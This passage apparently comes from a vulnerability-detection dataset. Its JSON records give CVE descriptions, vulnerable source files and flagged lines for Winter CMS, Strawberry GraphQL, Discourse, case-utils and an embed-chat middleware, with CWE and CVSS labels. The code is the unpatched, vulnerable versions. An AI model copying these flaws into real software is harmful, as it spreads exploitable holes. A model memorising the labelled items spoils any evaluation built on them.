        {
          "line_no": 62,
          "content": "  }"
        },
        {
          "line_no": 64,
          "content": "  // Check if requester hostname is in the valid allowlist of domains."
        },
        {
          "line_no": 65,
          "content": "  const host = request.headers.origin ?? \"\";"
        },
        {
          "line_no": 66,
          "content": "  const allowedHosts = EmbedConfig.parseAllowedHosts(embed);"
        },
        {
          "line_no": 67,
          "content": "  if (allowedHosts !== null && !allowedHosts.includes(host)) {"
        },
        {
          "line_no": 68,
          "content": "    response.status(401).json({"
        },
        {
          "line_no": 69,
          "content": "      id: uuidv4(),"
        },
        {
          "line_no": 70,
          "content": "      type: \"abort\","
        },
        {
          "line_no": 71,
          "content": "      textResponse: null,"
        },
        {
          "line_no": 72,
          "content": "      sources: [],"
        },
        {
          "line_no": 73,
          "content": "      close: true,"
        },
        {
          "line_no": 74,
          "content": "      error: \"Invalid request.\","
        },
        {
          "line_no": 75,
          "content": "    });"
        },
        {
          "line_no": 76,
          "content": "    return;"
        },
        {
          "line_no": 77,
          "content": "  }"
        },
        {
          "line_no": 79,
          "content": "  const { sessionId, message } = reqBody(request);"
        },
        {
          "line_no": 81,
          "content": "  if (!message?.length || !VALID_CHAT_MODE.includes(embed.chat_mode)) {"
        },
        {
          "line_no": 82,
          "content": "    response.status(400).json({"
        },
        {
          "line_no": 83,
          "content": "      id: uuidv4(),"
        },
        {
          "line_no": 84,
          "content": "      type: \"abort\","
        },
        {
          "line_no": 85,
          "content": "      textResponse: null,"
        },
        {
          "line_no": 86,
          "content": "      sources: [],"
        },
        {
          "line_no": 87,
          "content": "      close: true,"
        },
        {
          "line_no": 88,
          "content": "      error: !message?.length"
        },
        {
          "line_no": 89,
          "content": "        ? \"Message is empty.\""
        },
        {
          "line_no": 90,
          "content": "        : `${embed.chat_mode} is not a valid mode.`,"
        },
        {
          "line_no": 91,
          "content": "    });"
        },
        {
          "line_no": 92,
          "content": "    return;"
        },
        {
          "line_no": 93,
          "content": "  }"
        },
        {
          "line_no": 95,
          "content": "  if (!isNaN(embed.max_chats_per_day) && Number(embed.max_chats_per_day) > 0) {"
        },
        {
          "line_no": 96,
          "content": "    const dailyChatCount = await EmbedChats.count({"
        },
        {
          "line_no": 97,
          "content": "      embed_id: embed.id,"
        },
        {
          "line_no": 98,
          "content": "      createdAt: {"
        },
        {
          "line_no": 99,
          "content": "        gte: new Date(new Date() - 24 * 60 * 60 * 1000),"
        },
        {
          "line_no": 100,
          "content": "      },"
        },
        {
          "line_no": 101,
          "content": "    });"
        },
        {
          "line_no": 103,
          "content": "    if (dailyChatCount >= Number(embed.max_chats_per_day)) {"
        },
        {
          "line_no": 104,
          "content": "      response.status(429).json({"
        },
        {
          "line_no": 111,
          "content": "          \"The quota for this chat has been reached. Try again later or contact the site owner.\","
        },
        {
          "line_no": 115,
          "content": "  }"
        },
        {
          "line_no": 117,
          "content": "  if ("
        },
        {
          "line_no": 118,
          "content": "    !isNaN(embed.max_chats_per_session) &&"
        },
        {
          "line_no": 119,
          "content": "    Number(embed.max_chats_per_session) > 0"
        },
        {
          "line_no": 120,
          "content": "  ) {"
        },
        {
          "line_no": 121,
          "content": "    const dailySessionCount = await EmbedChats.count({"
        },
        {
          "line_no": 122,
          "content": "      embed_id: embed.id,"
        },
        {
          "line_no": 123,
          "content": "      session_id: sessionId,"
        },
        {
          "line_no": 124,
          "content": "      createdAt: {"
        },
        {
          "line_no": 125,
          "content": "        gte: new Date(new Date() - 24 * 60 * 60 * 1000),"
        },
        {
          "line_no": 126,
          "content": "      },"
        },
        {
          "line_no": 127,
          "content": "    });"
        },
        {
          "line_no": 129,
          "content": "    if (dailySessionCount >= Number(embed.max_chats_per_session)) {"
        },
        {
          "line_no": 130,
          "content": "      response.status(429).json({"
        },
        {
          "line_no": 136,
          "content": "        error:"
        },
        {
          "line_no": 137,
          "content": "          \"Your quota for this chat has been reached. Try again later or contact the site owner.\","
        },
        {
          "line_no": 141,
          "content": "  }"
        },
        {
          "line_no": 143,
          "content": "  next();"
        }
      ]
    },
    "cwe": [
      "CWE-248"
    ],
    "severity": "HIGH",
    "cvss_score": 7.5,
    "cvss_version": 3.0
  },
  {
    "id": 1326,
    "cve": "CVE-2024-54149",
    "description": "Winter is a free, open-source content management system (CMS) based on the Laravel PHP framework. Winter CMS prior to versions 1.2.7, 1.1.11, and 1.0.476 allow users with access to the CMS templates sections that modify Twig files to bypass the sandbox placed on Twig files and modify resources such as theme customisation values or modify, or remove, templates in the theme even if not provided direct access via the permissions. As all objects passed through to Twig are references to the live objects, it is also possible to also manipulate model data if models are passed directly to Twig, including changing attributes or even removing records entirely. In most cases, this is unwanted behavior and potentially dangerous. To actively exploit this security issue, an attacker would need access to the Backend with a user account with any of the following permissions: `cms.manage_layouts`; `cms.manage_pages`; or `cms.manage_partials`. The Winter CMS maintainers strongly recommend that these permissions only be reserved to trusted administrators and developers in general. The maintainers of Winter CMS have significantly increased the scope of the sandbox, effectively making all models and datasources read-only in Twig, in versions 1.2.7, 1.1.11, and 1.0.476. Thse who cannot upgrade may apply commit fb88e6fabde3b3278ce1844e581c87dcf7daee22 to their Winter CMS installation manually to resolve the issue. In the rare event that a Winter user was relying on being able to write to models/datasources within their Twig templates, they should instead use or create components to make changes to their models.",
    "vulnerability": {
      "file_level": [
        {
          "name": "modules/system/twig/SecurityPolicy.php",
          "content": "<?php namespace System\\Twig;\n\nuse Twig\\Markup;\nuse Twig\\Template;\nuse Twig\\Sandbox\\SecurityPolicyInterface;\nuse Twig\\Sandbox\\SecurityNotAllowedMethodError;\nuse Twig\\Sandbox\\SecurityNotAllowedPropertyError;\n\n/**\n * SecurityPolicy globally blocks accessibility of certain methods and properties.\n *\n * @package winter\\wn-system-module\n * @author Alexey Bobkov, Samuel Georges, Luke Towers\n */\nfinal class SecurityPolicy implements SecurityPolicyInterface\n{\n    /**\n     * @var array List of forbidden methods.\n     */\n    protected $blockedMethods = [\n        // Prevent accessing Twig itself\n        'getTwig',\n\n        // \\Winter\\Storm\\Extension\\ExtendableTrait\n        'addDynamicMethod',\n        'addDynamicProperty',\n\n        // \\Winter\\Storm\\Support\\Traits\\Emitter\n        'bindEvent',\n        'bindEventOnce',\n\n        // Eloquent & Halcyon data modification\n        'insert',\n        'update',\n        'delete',\n        'write',\n    ];\n\n    /**\n     * Constructor\n     */\n    public function __construct()\n    {\n        foreach ($this->blockedMethods as $i => $m) {\n            $this->blockedMethods[$i] = strtolower($m);\n        }\n    }\n\n    /**\n     * Check the provided arguments against this security policy\n     *\n     * @param array $tags Array of tags to be checked against the policy ['tag', 'tag2', 'etc']\n     * @param array $filters Array of filters to be checked against the policy ['filter', 'filter2', 'etc']\n     * @param array $functions Array of funtions to be checked against the policy ['function', 'function2', 'etc']\n     * @throws SecurityNotAllowedTagError if a given tag is not allowed\n     * @throws SecurityNotAllowedFilterError if a given filter is not allowed\n     * @throws SecurityNotAllowedFunctionError if a given function is not allowed\n     */\n    public function checkSecurity($tags, $filters, $functions): void\n    {\n    }\n\n    /**\n     * Checks if a given property is permitted to be accessed on a given object\n     *\n     * @param object $obj\n     * @param string $property\n     * @throws SecurityNotAllowedPropertyError\n     */\n    public function checkPropertyAllowed($obj, $property): void\n    {\n    }\n\n    /**\n     * Checks if a given method is allowed to be called on a given object\n     *\n     * @param object $obj\n     * @param string $method\n     * @throws SecurityNotAllowedMethodError\n     */\n    public function checkMethodAllowed($obj, $method): void\n    {\n        // No need to check Twig internal objects\n        if ($obj instanceof Template || $obj instanceof Markup) {\n            return;\n        }\n\n        $blockedMethod = strtolower($method);\n        if (in_array($blockedMethod, $this->blockedMethods)) {\n            $class = get_class($obj);\n            throw new SecurityNotAllowedMethodError(sprintf('Calling \"%s\" method on a \"%s\" object is blocked.', $method, $class), $class, $method);\n        }\n    }\n}\n"
        }
      ],
      "method_level": [
        "public function __construct()\n    {\n        foreach ($this->blockedMethods as $i => $m) {\n            $this->blockedMethods[$i] = strtolower($m);\n        }\n    }",
        "public function checkMethodAllowed($obj, $method): void\n    {\n        // No need to check Twig internal objects\n        if ($obj instanceof Template || $obj instanceof Markup) {\n            return;\n        }\n\n        $blockedMethod = strtolower($method);\n        if (in_array($blockedMethod, $this->blockedMethods)) {\n            $class = get_class($obj);\n            throw new SecurityNotAllowedMethodError(sprintf('Calling \"%s\" method on a \"%s\" object is blocked.', $method, $class), $class, $method);\n        }\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 44,
          "content": "        foreach ($this->blockedMethods as $i => $m) {"
        },
        {
          "line_no": 45,
          "content": "            $this->blockedMethods[$i] = strtolower($m);"
        },
        {
          "line_no": 88,
          "content": "        $blockedMethod = strtolower($method);"
        },
        {
          "line_no": 89,
          "content": "        if (in_array($blockedMethod, $this->blockedMethods)) {"
        }
      ]
    },
    "cwe": [
      "CWE-184"
    ],
    "severity": "HIGH",
    "cvss_score": 8.4,
    "cvss_version": 3.1
  },
  {
    "id": 1193,
    "cve": "CVE-2024-47082",
    "description": "Strawberry GraphQL is a library for creating GraphQL APIs. Prior to version 0.243.0, multipart file upload support as defined in the GraphQL multipart request specification was enabled by default in all Strawberry HTTP view integrations. This made all Strawberry HTTP view integrations vulnerable to cross-site request forgery (CSRF) attacks if users did not explicitly enable CSRF preventing security mechanism for their servers. Additionally, the Django HTTP view integration, in particular, had an exemption for Django's built-in CSRF protection (i.e., the `CsrfViewMiddleware` middleware) by default. In affect, all Strawberry integrations were vulnerable to CSRF attacks by default. Version `v0.243.0` is the first `strawberry-graphql` including a patch.",
    "vulnerability": {
      "file_level": [
        {
          "name": "strawberry/http/sync_base_view.py",
          "content": "import abc\nimport json\nfrom typing import (\n    Any,\n    Callable,\n    Dict,\n    Generic,\n    List,\n    Mapping,\n    Optional,\n    Union,\n)\n\nfrom graphql import GraphQLError\n\nfrom strawberry import UNSET\nfrom strawberry.exceptions import MissingQueryError\nfrom strawberry.file_uploads.utils import replace_placeholders_with_files\nfrom strawberry.http import (\n    GraphQLHTTPResponse,\n    GraphQLRequestData,\n    process_result,\n)\nfrom strawberry.http.ides import GraphQL_IDE\nfrom strawberry.schema import BaseSchema\nfrom strawberry.schema.exceptions import InvalidOperationTypeError\nfrom strawberry.types import ExecutionResult\nfrom strawberry.types.graphql import OperationType\n\nfrom .base import BaseView\nfrom .exceptions import HTTPException\nfrom .parse_content_type import parse_content_type\nfrom .types import HTTPMethod, QueryParams\nfrom .typevars import Context, Request, Response, RootValue, SubResponse\n\n\nclass SyncHTTPRequestAdapter(abc.ABC):\n    @property\n    @abc.abstractmethod\n    def query_params(self) -> QueryParams: ...\n\n    @property\n    @abc.abstractmethod\n    def body(self) -> Union[str, bytes]: ...\n\n    @property\n    @abc.abstractmethod\n    def method(self) -> HTTPMethod: ...\n\n    @property\n    @abc.abstractmethod\n    def headers(self) -> Mapping[str, str]: ...\n\n    @property\n    @abc.abstractmethod\n    def content_type(self) -> Optional[str]: ...\n\n    @property\n    @abc.abstractmethod\n    def post_data(self) -> Mapping[str, Union[str, bytes]]: ...\n\n    @property\n    @abc.abstractmethod\n    def files(self) -> Mapping[str, Any]: ...\n\n\nclass SyncBaseHTTPView(\n    abc.ABC,\n    BaseView[Request],\n    Generic[Request, Response, SubResponse, Context, RootValue],\n):\n    schema: BaseSchema\n    graphiql: Optional[bool]\n    graphql_ide: Optional[GraphQL_IDE]\n    request_adapter_class: Callable[[Request], SyncHTTPRequestAdapter]\n\n    # Methods that need to be implemented by individual frameworks\n\n    @property\n    @abc.abstractmethod\n    def allow_queries_via_get(self) -> bool: ...\n\n    @abc.abstractmethod\n    def get_sub_response(self, request: Request) -> SubResponse: ...\n\n    @abc.abstractmethod\n    def get_context(self, request: Request, response: SubResponse) -> Context: ...\n\n    @abc.abstractmethod\n    def get_root_value(self, request: Request) -> Optional[RootValue]: ...\n\n    @abc.abstractmethod\n    def create_response(\n        self, response_data: GraphQLHTTPResponse, sub_response: SubResponse\n    ) -> Response: ...\n\n    @abc.abstractmethod\n    def render_graphql_ide(self, request: Request) -> Response: ...\n\n    def execute_operation(\n        self, request: Request, context: Context, root_value: Optional[RootValue]\n    ) -> ExecutionResult:\n        request_adapter = self.request_adapter_class(request)\n\n        try:\n            request_data = self.parse_http_body(request_adapter)\n        except json.decoder.JSONDecodeError as e:\n            raise HTTPException(400, \"Unable to parse request body as JSON\") from e\n            # DO this only when doing files\n        except KeyError as e:\n            raise HTTPException(400, \"File(s) missing in form data\") from e\n\n        allowed_operation_types = OperationType.from_http(request_adapter.method)\n\n        if not self.allow_queries_via_get and request_adapter.method == \"GET\":\n            allowed_operation_types = allowed_operation_types - {OperationType.QUERY}\n\n        assert self.schema\n\n        return self.schema.execute_sync(\n            request_data.query,\n            root_value=root_value,\n            variable_values=request_data.variables,\n            context_value=context,\n            operation_name=request_data.operation_name,\n            allowed_operation_types=allowed_operation_types,\n        )\n\n    def parse_multipart(self, request: SyncHTTPRequestAdapter) -> Dict[str, str]:\n        operations = self.parse_json(request.post_data.get(\"operations\", \"{}\"))\n        files_map = self.parse_json(request.post_data.get(\"map\", \"{}\"))\n\n        try:\n            return replace_placeholders_with_files(operations, files_map, request.files)\n        except KeyError as e:\n            raise HTTPException(400, \"File(s) missing in form data\") from e\n\n    def parse_http_body(self, request: SyncHTTPRequestAdapter) -> GraphQLRequestData:\n        content_type, params = parse_content_type(request.content_type or \"\")\n\n        if request.method == \"GET\":\n            data = self.parse_query_params(request.query_params)\n        elif \"application/json\" in content_type:\n            data = self.parse_json(request.body)\n        # TODO: multipart via get?\n        elif content_type == \"multipart/form-data\":\n            data = self.parse_multipart(request)\n        elif self._is_multipart_subscriptions(content_type, params):\n            raise HTTPException(\n                400, \"Multipart subcriptions are not supported in sync mode\"\n            )\n        else:\n            raise HTTPException(400, \"Unsupported content type\")\n\n        return GraphQLRequestData(\n            query=data.get(\"query\"),\n            variables=data.get(\"variables\"),\n            operation_name=data.get(\"operationName\"),\n        )\n\n    def _handle_errors(\n        self, errors: List[GraphQLError], response_data: GraphQLHTTPResponse\n    ) -> None:\n        \"\"\"Hook to allow custom handling of errors, used by the Sentry Integration.\"\"\"\n\n    def run(\n        self,\n        request: Request,\n        context: Optional[Context] = UNSET,\n        root_value: Optional[RootValue] = UNSET,\n    ) -> Response:\n        request_adapter = self.request_adapter_class(request)\n\n        if not self.is_request_allowed(request_adapter):\n            raise HTTPException(405, \"GraphQL only supports GET and POST requests.\")\n\n        if self.should_render_graphql_ide(request_adapter):\n            if self.graphql_ide:\n                return self.render_graphql_ide(request)\n            else:\n                raise HTTPException(404, \"Not Found\")\n\n        sub_response = self.get_sub_response(request)\n        context = (\n            self.get_context(request, response=sub_response)\n            if context is UNSET\n            else context\n        )\n        root_value = self.get_root_value(request) if root_value is UNSET else root_value\n\n        assert context\n\n        try:\n            result = self.execute_operation(\n                request=request,\n                context=context,\n                root_value=root_value,\n            )\n        except InvalidOperationTypeError as e:\n            raise HTTPException(\n                400, e.as_http_error_reason(request_adapter.method)\n            ) from e\n        except MissingQueryError as e:\n            raise HTTPException(400, \"No GraphQL query found in the request\") from e\n\n        response_data = self.process_result(request=request, result=result)\n\n        if result.errors:\n            self._handle_errors(result.errors, response_data)\n\n        return self.create_response(\n            response_data=response_data, sub_response=sub_response\n        )\n\n    def process_result(\n        self, request: Request, result: ExecutionResult\n    ) -> GraphQLHTTPResponse:\n        return process_result(result)\n\n\n__all__ = [\"SyncBaseHTTPView\"]\n"
        }
      ],
      "method_level": [
        "def parse_http_body(self, request: SyncHTTPRequestAdapter) -> GraphQLRequestData:\n        content_type, params = parse_content_type(request.content_type or \"\")\n\n        if request.method == \"GET\":\n            data = self.parse_query_params(request.query_params)\n        elif \"application/json\" in content_type:\n            data = self.parse_json(request.body)\n        # TODO: multipart via get?\n        elif content_type == \"multipart/form-data\":\n            data = self.parse_multipart(request)\n        elif self._is_multipart_subscriptions(content_type, params):\n            raise HTTPException(\n                400, \"Multipart subcriptions are not supported in sync mode\"\n            )\n        else:\n            raise HTTPException(400, \"Unsupported content type\")\n\n        return GraphQLRequestData(\n            query=data.get(\"query\"),\n            variables=data.get(\"variables\"),\n            operation_name=data.get(\"operationName\"),\n        )"
      ],
      "hunk_level": [
        {
          "line_no": 146,
          "content": "        elif content_type == \"multipart/form-data\":"
        }
      ]
    },
    "cwe": [
      "CWE-352"
    ],
    "severity": "MEDIUM",
    "cvss_score": 4.6,
    "cvss_version": 3.1
  },
  {
    "id": 1021,
    "cve": "CVE-2024-39320",
    "description": "Discourse is an open source discussion platform. Prior to 3.2.5 and 3.3.0.beta5, the vulnerability allows an attacker to inject iframes from any domain, bypassing the intended restrictions enforced by the allowed_iframes setting. This vulnerability is fixed in 3.2.5 and 3.3.0.beta5.",
    "vulnerability": {
      "file_level": [
        {
          "name": "app/assets/javascripts/discourse-markdown-it/src/options.js",
          "content": "import { deepMerge } from \"discourse-common/lib/object\";\n\n// the options are passed here and must be explicitly allowed with\n// the const options & state below\nexport default function buildOptions(state) {\n  const {\n    siteSettings,\n    getURL,\n    lookupAvatar,\n    lookupPrimaryUserGroup,\n    getTopicInfo,\n    topicId,\n    postId,\n    forceQuoteLink,\n    userId,\n    getCurrentUser,\n    currentUser,\n    lookupAvatarByPostNumber,\n    lookupPrimaryUserGroupByPostNumber,\n    formatUsername,\n    emojiUnicodeReplacer,\n    lookupUploadUrls,\n    previewing,\n    censoredRegexp,\n    disableEmojis,\n    customEmojiTranslation,\n    watchedWordsReplace,\n    watchedWordsLink,\n    emojiDenyList,\n    featuresOverride,\n    markdownItRules,\n    additionalOptions,\n    hashtagTypesInPriorityOrder,\n    hashtagIcons,\n    hashtagLookup,\n  } = state;\n\n  let features = {};\n\n  if (state.features) {\n    features = deepMerge(features, state.features);\n  }\n\n  const options = {\n    sanitize: true,\n    getURL,\n    features,\n    lookupAvatar,\n    lookupPrimaryUserGroup,\n    getTopicInfo,\n    topicId,\n    postId,\n    forceQuoteLink,\n    userId,\n    getCurrentUser,\n    currentUser,\n    lookupAvatarByPostNumber,\n    lookupPrimaryUserGroupByPostNumber,\n    formatUsername,\n    emojiUnicodeReplacer,\n    lookupUploadUrls,\n    censoredRegexp,\n    customEmojiTranslation,\n    allowedHrefSchemes: siteSettings.allowed_href_schemes\n      ? siteSettings.allowed_href_schemes.split(\"|\")\n      : null,\n    allowedIframes: siteSettings.allowed_iframes\n      ? siteSettings.allowed_iframes.split(\"|\")\n      : [],\n    markdownIt: true,\n    previewing,\n    disableEmojis,\n    watchedWordsReplace,\n    watchedWordsLink,\n    emojiDenyList,\n    featuresOverride,\n    markdownItRules,\n    additionalOptions,\n    hashtagTypesInPriorityOrder,\n    hashtagIcons,\n    hashtagLookup,\n  };\n\n  return { options, siteSettings, state };\n}\n"
        }
      ],
      "method_level": [
        "function buildOptions(state) {\n  const {\n    siteSettings,\n    getURL,\n    lookupAvatar,\n    lookupPrimaryUserGroup,\n    getTopicInfo,\n    topicId,\n    postId,\n    forceQuoteLink,\n    userId,\n    getCurrentUser,\n    currentUser,\n    lookupAvatarByPostNumber,\n    lookupPrimaryUserGroupByPostNumber,\n    formatUsername,\n    emojiUnicodeReplacer,\n    lookupUploadUrls,\n    previewing,\n    censoredRegexp,\n    disableEmojis,\n    customEmojiTranslation,\n    watchedWordsReplace,\n    watchedWordsLink,\n    emojiDenyList,\n    featuresOverride,\n    markdownItRules,\n    additionalOptions,\n    hashtagTypesInPriorityOrder,\n    hashtagIcons,\n    hashtagLookup,\n  } = state;\n\n  let features = {};\n\n  if (state.features) {\n    features = deepMerge(features, state.features);\n  }\n\n  const options = {\n    sanitize: true,\n    getURL,\n    features,\n    lookupAvatar,\n    lookupPrimaryUserGroup,\n    getTopicInfo,\n    topicId,\n    postId,\n    forceQuoteLink,\n    userId,\n    getCurrentUser,\n    currentUser,\n    lookupAvatarByPostNumber,\n    lookupPrimaryUserGroupByPostNumber,\n    formatUsername,\n    emojiUnicodeReplacer,\n    lookupUploadUrls,\n    censoredRegexp,\n    customEmojiTranslation,\n    allowedHrefSchemes: siteSettings.allowed_href_schemes\n      ? siteSettings.allowed_href_schemes.split(\"|\")\n      : null,\n    allowedIframes: siteSettings.allowed_iframes\n      ? siteSettings.allowed_iframes.split(\"|\")\n      : [],\n    markdownIt: true,\n    previewing,\n    disableEmojis,\n    watchedWordsReplace,\n    watchedWordsLink,\n    emojiDenyList,\n    featuresOverride,\n    markdownItRules,\n    additionalOptions,\n    hashtagTypesInPriorityOrder,\n    hashtagIcons,\n    hashtagLookup,\n  };\n\n  return { options, siteSettings, state };\n}"
      ],
      "hunk_level": [
        {
          "line_no": 68,
          "content": "      ? siteSettings.allowed_iframes.split(\"|\")"
        },
        {
          "line_no": 69,
          "content": "      : [],"
        }
      ]
    },
    "cwe": [
      "CWE-74",
      "CWE-1021"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.1,
    "cvss_version": 3.1
  },
  {
    "id": 54,
    "cve": "CVE-2024-22194",
    "description": "cdo-local-uuid project provides a specialized UUID-generating function that can, on user request, cause a program to generate deterministic UUIDs. An information leakage vulnerability is present in `cdo-local-uuid` at version `0.4.0`, and in `case-utils` in unpatched versions (matching the pattern `0.x.0`) at and since `0.5.0`, before `0.15.0`. The vulnerability stems from a Python function, `cdo_local_uuid.local_uuid()`, and its original implementation `case_utils.local_uuid()`. ",
    "vulnerability": {
      "file_level": [
        {
          "name": "case_utils/local_uuid.py",
          "content": "#!/usr/bin/env python3\n\n# This software was developed at the National Institute of Standards\n# and Technology by employees of the Federal Government in the course\n# of their official duties. Pursuant to title 17 Section 105 of the\n# United States Code this software is not subject to copyright\n# protection and is in the public domain. NIST assumes no\n# responsibility whatsoever for its use by other parties, and makes\n# no guarantees, expressed or implied, about its quality,\n# reliability, or any other characteristic.\n#\n# We would appreciate acknowledgement if the software is used.\n\n\"\"\"\nThis library is a wrapper for uuid, provided to generate repeatable UUIDs if requested.\n\"\"\"\n\n__version__ = \"0.3.2\"\n\nimport logging\nimport os\nimport pathlib\nimport sys\nimport typing\nimport uuid\nimport warnings\n\nDEMO_UUID_BASE: typing.Optional[str] = None\n\nDEMO_UUID_COUNTER: int = 0\n\n_logger = logging.getLogger(pathlib.Path(__file__).name)\n\n\ndef configure() -> None:\n    \"\"\"\n    This function is part of setting up demo_uuid() to generate non-random UUIDs.  See demo_uuid() documentation for further setup notes.\n    \"\"\"\n    global DEMO_UUID_BASE\n\n    if os.getenv(\"DEMO_UUID_REQUESTING_NONRANDOM\") == \"NONRANDOM_REQUESTED\":\n        warnings.warn(\n            \"Environment variable DEMO_UUID_REQUESTING_NONRANDOM is deprecated.  See case_utils.local_uuid.demo_uuid for usage notes on its replacement, CASE_DEMO_NONRANDOM_UUID_BASE.  Proceeding with random UUIDs.\",\n            FutureWarning,\n        )\n        return\n\n    env_base_dir_name = os.getenv(\"CASE_DEMO_NONRANDOM_UUID_BASE\")\n    if env_base_dir_name is None:\n        return\n\n    base_dir_original_path = pathlib.Path(env_base_dir_name)\n    if not base_dir_original_path.exists():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to an existing directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n    if not base_dir_original_path.is_dir():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to a directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n\n    # Component: An emphasis this is an example.\n    demo_uuid_base_parts = [\"example.org\"]\n\n    # Component: Present working directory, relative to CASE_DEMO_NONRANDOM_UUID_BASE if that environment variable is an ancestor of pwd.\n    base_dir_resolved_path = base_dir_original_path.resolve()\n    srcdir_original_path = pathlib.Path(os.getcwd())\n    srcdir_resolved_path = srcdir_original_path.resolve()\n    # _logger.debug(\"base_dir_resolved_path = %r.\", base_dir_resolved_path)\n    # _logger.debug(\"srcdir_resolved_path = %r.\", srcdir_resolved_path)\n    try:\n        srcdir_relative_path = srcdir_resolved_path.relative_to(base_dir_resolved_path)\n        # _logger.debug(\"srcdir_relative_path = %r.\", srcdir_relative_path)\n        demo_uuid_base_parts.append(str(srcdir_relative_path))\n    except ValueError:\n        # If base_dir is not an ancestor directory of srcdir, default to srcdir.\n        # _logger.debug(\"PWD is not relative to base path.\")\n        demo_uuid_base_parts.append(str(srcdir_resolved_path))\n\n    # Component: Command of argument vector.\n    env_venv_name = os.getenv(\"VIRTUAL_ENV\")\n    if env_venv_name is None:\n        demo_uuid_base_parts.append(sys.argv[0])\n    else:\n        command_original_path = pathlib.Path(sys.argv[0])\n        command_resolved_path = command_original_path.resolve()\n        venv_original_path = pathlib.Path(env_venv_name)\n        venv_resolved_path = venv_original_path.resolve()\n        try:\n            command_relative_path = command_resolved_path.relative_to(\n                venv_resolved_path\n            )\n            # _logger.debug(\"command_relative_path = %r.\", command_relative_path)\n            demo_uuid_base_parts.append(str(command_relative_path))\n        except ValueError:\n            # _logger.debug(\"Command path is not relative to virtual environment path.\")\n            demo_uuid_base_parts.append(str(command_resolved_path))\n\n    if len(sys.argv) > 1:\n        # Component: Arguments of argument vector.\n        demo_uuid_base_parts.extend(sys.argv[1:])\n\n    # _logger.debug(\"demo_uuid_base_parts = %r.\", demo_uuid_base_parts)\n\n    DEMO_UUID_BASE = \"/\".join(demo_uuid_base_parts)\n\n\ndef demo_uuid() -> str:\n    \"\"\"\n    This function generates a repeatable UUID, drawing on non-varying elements of the environment and process call for entropy.\n\n    WARNING: This function was developed for use ONLY for reducing (but not eliminating) version-control edits to identifiers when generating sample data.  It creates UUIDs that are decidedly NOT random, and should remain consistent on repeated calls to the importing script.\n\n    To prevent accidental non-random UUID usage, two setup steps need to be done before calling this function:\n\n    * An environment variable, CASE_DEMO_NONRANDOM_UUID_BASE, must be set to a string provided by the caller.  The variable's required value is the path to some directory.  The variable's recommended value is the equivalent of the Make variable \"top_srcdir\" - that is, the root directory of the containing Git repository, some parent of the current process's current working directory.\n    * The configure() function in this module must be called.\n    \"\"\"\n    global DEMO_UUID_BASE\n    global DEMO_UUID_COUNTER\n\n    if os.getenv(\"CASE_DEMO_NONRANDOM_UUID_BASE\") is None:\n        raise ValueError(\n            \"demo_uuid() called without CASE_DEMO_NONRANDOM_UUID_BASE in environment.\"\n        )\n\n    if DEMO_UUID_BASE is None:\n        raise ValueError(\"demo_uuid() called with DEMO_UUID_BASE unset.\")\n\n    parts = [DEMO_UUID_BASE]\n\n    # Component: Incrementing counter.\n    DEMO_UUID_COUNTER += 1\n    parts.append(str(DEMO_UUID_COUNTER))\n\n    return str(uuid.uuid5(uuid.NAMESPACE_URL, \"/\".join(parts)))\n\n\ndef local_uuid() -> str:\n    \"\"\"\n    Generate either a UUID4, or if requested via environment configuration, a non-random demo UUID.\n    \"\"\"\n    global DEMO_UUID_BASE\n    if DEMO_UUID_BASE is None:\n        return str(uuid.uuid4())\n    else:\n        return demo_uuid()\n"
        }
      ],
      "method_level": [
        "def configure() -> None:\n    \"\"\"\n    This function is part of setting up demo_uuid() to generate non-random UUIDs.  See demo_uuid() documentation for further setup notes.\n    \"\"\"\n    global DEMO_UUID_BASE\n\n    if os.getenv(\"DEMO_UUID_REQUESTING_NONRANDOM\") == \"NONRANDOM_REQUESTED\":\n        warnings.warn(\n            \"Environment variable DEMO_UUID_REQUESTING_NONRANDOM is deprecated.  See case_utils.local_uuid.demo_uuid for usage notes on its replacement, CASE_DEMO_NONRANDOM_UUID_BASE.  Proceeding with random UUIDs.\",\n            FutureWarning,\n        )\n        return\n\n    env_base_dir_name = os.getenv(\"CASE_DEMO_NONRANDOM_UUID_BASE\")\n    if env_base_dir_name is None:\n        return\n\n    base_dir_original_path = pathlib.Path(env_base_dir_name)\n    if not base_dir_original_path.exists():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to an existing directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n    if not base_dir_original_path.is_dir():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to a directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n\n    # Component: An emphasis this is an example.\n    demo_uuid_base_parts = [\"example.org\"]\n\n    # Component: Present working directory, relative to CASE_DEMO_NONRANDOM_UUID_BASE if that environment variable is an ancestor of pwd.\n    base_dir_resolved_path = base_dir_original_path.resolve()\n    srcdir_original_path = pathlib.Path(os.getcwd())\n    srcdir_resolved_path = srcdir_original_path.resolve()\n    # _logger.debug(\"base_dir_resolved_path = %r.\", base_dir_resolved_path)\n    # _logger.debug(\"srcdir_resolved_path = %r.\", srcdir_resolved_path)\n    try:\n        srcdir_relative_path = srcdir_resolved_path.relative_to(base_dir_resolved_path)\n        # _logger.debug(\"srcdir_relative_path = %r.\", srcdir_relative_path)\n        demo_uuid_base_parts.append(str(srcdir_relative_path))\n    except ValueError:\n        # If base_dir is not an ancestor directory of srcdir, default to srcdir.\n        # _logger.debug(\"PWD is not relative to base path.\")\n        demo_uuid_base_parts.append(str(srcdir_resolved_path))\n\n    # Component: Command of argument vector.\n    env_venv_name = os.getenv(\"VIRTUAL_ENV\")\n    if env_venv_name is None:\n        demo_uuid_base_parts.append(sys.argv[0])\n    else:\n        command_original_path = pathlib.Path(sys.argv[0])\n        command_resolved_path = command_original_path.resolve()\n        venv_original_path = pathlib.Path(env_venv_name)\n        venv_resolved_path = venv_original_path.resolve()\n        try:\n            command_relative_path = command_resolved_path.relative_to(\n                venv_resolved_path\n            )\n            # _logger.debug(\"command_relative_path = %r.\", command_relative_path)\n            demo_uuid_base_parts.append(str(command_relative_path))\n        except ValueError:\n            # _logger.debug(\"Command path is not relative to virtual environment path.\")\n            